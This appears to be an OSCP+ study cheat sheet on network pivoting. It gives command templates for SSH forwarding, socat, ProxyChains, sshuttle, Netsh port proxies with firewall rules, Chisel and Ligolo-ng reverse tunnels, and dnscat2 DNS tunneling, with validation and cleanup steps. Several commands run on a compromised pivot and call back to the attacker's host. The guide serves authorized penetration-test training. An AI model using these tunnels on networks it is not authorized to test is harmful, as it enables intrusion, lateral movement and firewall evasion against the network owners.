Route ledger

TOOL -> ENTRY LISTENER/SOCKS/TUN -> TRANSPORT -> PIVOT -> DESTINATION
TCP/UDP | initiator | bind | DNS point | credential/SPN | callback | cleanup

Verify in order: process → listener/session → pivot destination reachability → local route/proxy → simple TCP client → application → separate callback.

Pivot network state

ip -brief address
ip route
ip neigh
ss -lntup
cat /etc/resolv.conf
nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT

ipconfig /all
route print
arp -a
netstat -ano

Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT

Socat fixed TCP relay

socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \
  TCP:INTERNAL_HOST:INTERNAL_PORT

No authentication or encryption. Listener success does not prove the destination connection.

OpenSSH

Local fixed forward, run on Kali:

ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \
  -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 -o ServerAliveCountMax=3

Local SOCKS, run on Kali:

ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \
  -o ExitOnForwardFailure=yes

Remote fixed forward, run on pivot:

ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \
  -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes

Remote dynamic SOCKS, run on pivot; OpenSSH client 7.6+:

ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \
  -o ExitOnForwardFailure=yes

SSH jump and native SOCKS route:

ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \
  TARGET_USER@INTERNAL_HOST

-L/-D listen on the SSH client; -R listens on the SSH server. The destination connection occurs from the opposite end. Non-loopback remote binds depend on GatewayPorts.

ProxyChains

Task-specific proxychains-pivot.conf:

strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080

proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/
proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST
proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \
  'DOMAIN/USER:PASSWORD@INTERNAL_HOST'

curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/
ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT

ProxyChains is TCP-only and depends on compatible dynamically linked socket calls. No SYN, ICMP, UDP or pcap discovery. Prefer native proxy options; use focused nmap -sT -Pn -n only.

sshuttle

sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET ANOTHER_SUBNET
sudo sshuttle --dns -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT INTERNAL_SUBNET

Requires client-side privileges/firewall support and a compatible Python path on the SSH server. Avoid route collisions with VPN networks.

Windows

Built-in OpenSSH remote dynamic:

ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes

Plink remote fixed forward:

plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^
  -l KALI_USER -pwfile C:\PATH\kali-password.txt ^
  -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^
  -P KALI_SSH_PORT LHOST

Netsh fixed TCP relay and cleanup, elevated:

netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT
netsh interface portproxy show all
netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" dir=in action=allow protocol=TCP localport=LOCAL_PORT

netsh interface portproxy delete v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT
netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT"

Netsh is TCP-only, elevated and persistent. Verify firewall and IP Helper behavior; remove both objects.

Chisel

Reverse SOCKS:

# Kali
chisel server --reverse --port CHISEL_PORT

# Pivot
chisel client --fingerprint 'SERVER_FINGERPRINT' \
  LHOST:CHISEL_PORT R:127.0.0.1:1080:socks

Reverse fixed TCP forward:

chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \
  R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT

Forward SOCKS:

# Pivot
chisel server --socks5 --port CHISEL_PORT
# Kali
chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \
  127.0.0.1:1080:socks

Current UDP-aware listener:

chisel client --fingerprint 'SERVER_FINGERPRINT' \
  LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks

socks is TCP CONNECT only. udpsocks additionally supports SOCKS5 UDP ASSOCIATE with current peers, but ProxyChains still cannot carry UDP. Check OS/architecture/runtime compatibility and WebSocket upgrade behavior.

Ligolo-ng

# Kali
./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT

# Pivot, after reading certificate_fingerprint in the console
./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT

Ligolo console:

interface_create --name ligolo
session
ifconfig
interface_add_route --name ligolo --route INTERNAL_SUBNET
tunnel_start --tun ligolo

Manual route fallback:

sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ip route add INTERNAL_SUBNET dev ligolo

Pivot loopback service:

sudo ip route add 240.0.0.1/32 dev ligolo
nmap -sT -Pn -n -p PORTS 240.0.0.1

Callback listener in selected session:

listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp
listener_list
listener_stop LISTENER_ID

DNS tunneling, conditional

# Authoritative domain server
dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN

# Client
./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN

# Direct server mode
./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET

windows
window -i SESSION_ID
help

Needs client execution plus authoritative NS delegation or direct DNS-server reachability. Slow and conspicuous. A query reaching the server is not yet an authenticated channel. DNS tunneling is distinct from prohibited DNS spoofing.

Callback route

Kali -> tunnel -> internal service          access path
internal target -> pivot listener -> Kali   callback path

If a callback is required, separately verify the pivot listener, relay, Kali bind address and target-to-pivot reachability. Do not change payloads until this route is proven.

Cleanup and restriction

Remove temporary TUN routes/interfaces, Ligolo listeners, Chisel/Socat/SSH processes, host mappings, Netsh/firewall rules and password files. Record the exact route before cleanup.

The current OSCP+ exam guide explicitly prohibits Metasploit pivoting.

Discover and recognize candidates

Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

Reach internal services

Find: Discover pivot interfaces, routes and internal service context

On the foothold inspect interfaces/routes and local listeners, then test an explicitly assigned destination from that host.

ip addr
ip route
ss -lntup

Recognize: A second network or loopback listener supplies a new vantage candidate; forwarding is not automatically enabled.

Validate next: Read interfaces/routes/listeners on the pivot and probe the internal destination from that host. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works.

Discover pivot interfaces, routes and internal service context.

Find: Relay a single TCP service through a fixed forward

From pivot-state evidence identify one fixed TCP destination and where the assessment client can reach a pivot listener.

ip route get TARGET
ss -lnt

Recognize: A single TCP service can fit a fixed relay without assuming a full routed network.

Validate next: Confirm both legs, bind address/permission and any additional dynamic ports or return path.

Relay a single TCP service through a fixed forward.

Find: Forward a selected service through an SSH client-side listener

Use accepted SSH and the SSH server's verified reachability to a selected internal/loopback service; identify where the local client needs its listener.

ssh -v -p SSH_PORT USER@PIVOT
ss -lnt

Recognize: Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server.

Validate next: Verify forwarding policy, local bind and server-to-destination application access.

Forward a selected service through an SSH client-side listener.

Find: Provide SOCKS access through SSH dynamic forwarding

From accepted SSH and a mapped internal service set determine whether each required client can use a SOCKS TCP connection.

ssh -v -p SSH_PORT USER@PIVOT

Recognize: Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards.

Validate next: Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location.

Provide SOCKS access through SSH dynamic forwarding.

Find: Expose an SSH-client-side destination through a server-side remote listener

Identify an outbound-only pivot-to-SSH-server path and a service reached from that SSH client/pivot; decide where the remote listener is needed.

ssh -v USER@SSH_SERVER

Recognize: The useful listener is on the SSH server while the destination is reached from the client side: a remote forward candidate.

Validate next: Verify remote-forward permission, server bind/GatewayPorts policy and pivot-side destination reachability.

Expose an SSH-client-side destination through a server-side remote listener.

Find: Expose a server-side SOCKS proxy through remote dynamic SSH forwarding

For an outbound-only SSH path identify the need for several client-selected destinations and inspect the actual SSH client implementation/version.

ssh -V

Recognize: Remote listener placement plus per-connection SOCKS destination selection suggests remote dynamic forwarding.

Validate next: Check implementation support, remote-forward policy, listener binding and proxy-client/DNS compatibility.

Expose a server-side SOCKS proxy through remote dynamic SSH forwarding.

Find: Use ProxyChains, native SOCKS clients and SSH jump paths appropriately

Inspect the established proxy/jump topology and each intended client's actual SOCKS or SSH-jump support before a protocol test.

curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/

Recognize: One supported TCP application works; the proxy does not automatically carry raw packets or arbitrary DNS/UDP.

Validate next: Check native versus intercepted support, connect-only scanner modes, name resolution and every required protocol leg.

Use ProxyChains, native SOCKS clients and SSH jump paths appropriately.

Find: Route a selected subnet through sshuttle

Identify several internal TCP destinations, existing SSH access and whether the local/remote privilege/runtime requirements can be met.

ssh -v USER@PIVOT
python3 --version
ip route

Recognize: An SSH carrier and compatible endpoints make a transparent selected-subnet route a candidate; local Python output alone does not prove the remote runtime.

Validate next: Verify local route/firewall permissions, remote runtime, supported transport/mode and explicitly selected subnet/DNS behavior.

Route a selected subnet through sshuttle.

Find: Forward from Windows with OpenSSH, Plink or Netsh

From a Windows pivot inspect native/available tunnel utilities, its route to the destination and the rights needed by the selected implementation.

Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue
Get-Service iphlpsvc
Test-NetConnection TARGET -Port PORT

Recognize: Windows has a carrier/destination candidate; Netsh administrative state and user-space SSH requirements differ.

Validate next: Choose the supported tool, verify listener/bind/firewall and correct connection direction; check its exact rights.

Forward from Windows with OpenSSH, Plink or Netsh.

Find: Use a reverse Chisel SOCKS or fixed TCP tunnel

Map an outbound pivot-to-server HTTP/WebSocket path and identify whether the assessment side needs a fixed listener or SOCKS access.

chisel --version
chisel server --help
chisel client --help

Recognize: The outbound carrier and server-side listener requirement identify a reverse-tunnel topology.

Validate next: Verify server reverse mode, fingerprint, carrier upgrade, listener bind and pivot-to-destination compatibility.

Use a reverse Chisel SOCKS or fixed TCP tunnel.

Find: Use forward Chisel SOCKS and version-supported UDP routing

Identify which side can reach a tunnel server, then inspect the exact peer version and whether TCP or SOCKS5 UDP ASSOCIATE is required.

chisel --version
chisel client --help

Recognize: Forward placement and actual client transport determine the mode; a UDP-capable tunnel binary does not make every wrapper UDP-capable.

Validate next: Verify compatible peers, server SOCKS setting, listener route and the real application's UDP/TCP support.

Use forward Chisel SOCKS and version-supported UDP routing.

Find: Route a selected internal subnet through Ligolo-ng

Use the pivot's route/interface evidence and the intended application's transport needs to decide whether a routed interface is appropriate.

ip route
ip link
./proxy -h

Recognize: A selected internal network and proxy-incompatible client suggest a route-style agent, subject to its own transport behavior.

Validate next: Verify compatible proxy/agent, local privileges, carrier, selected route/interface, DNS and any separate reverse listener.

Route a selected internal subnet through Ligolo-ng.

Find: Preserve DNS, Kerberos names and time across a pivot

Compare name resolution, ticket server principals, clock and the KDC path when an IP service works but named authentication fails.

getent hosts TARGET_HOST
klist
date -u

Recognize: The route and credential may be valid while name/SPN context is wrong.

Validate next: Check intended DNS source/result, realm/service name, time and KDC/service routes separately.

Preserve DNS, Kerberos names and time across a pivot.

Find: Build the callback and delivery routes separately from the attack route

After the attack path works, draw a new path for target-initiated callbacks/downloads and inspect the listener actually advertised to that target.

ss -lnt
ip route get TARGET

Recognize: A working initiating proxy path does not route a target's new connection back to that private interface.

Validate next: Check the target's route, listener bind, chosen reverse forward/agent listener and final handler.

Build the callback and delivery routes separately from the attack route.

Find: Compose multiple pivots and validate every connection leg

Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination.

hostname
ip route
ss -lnt

Recognize: The break lies beyond a known working leg; a connected second carrier is not a complete final route.

Validate next: Test each listener-to-destination leg, names and return traffic independently from the correct source.

Compose multiple pivots and validate every connection leg.

Find: Conditional: tunnel through controlled DNS infrastructure

Use known carrier restrictions and an explicitly approved controlled domain to inspect delegation and DNS reachability.

dig DOMAIN NS

Recognize: Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel.

Validate next: Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation.

Conditional: tunnel through controlled DNS infrastructure.
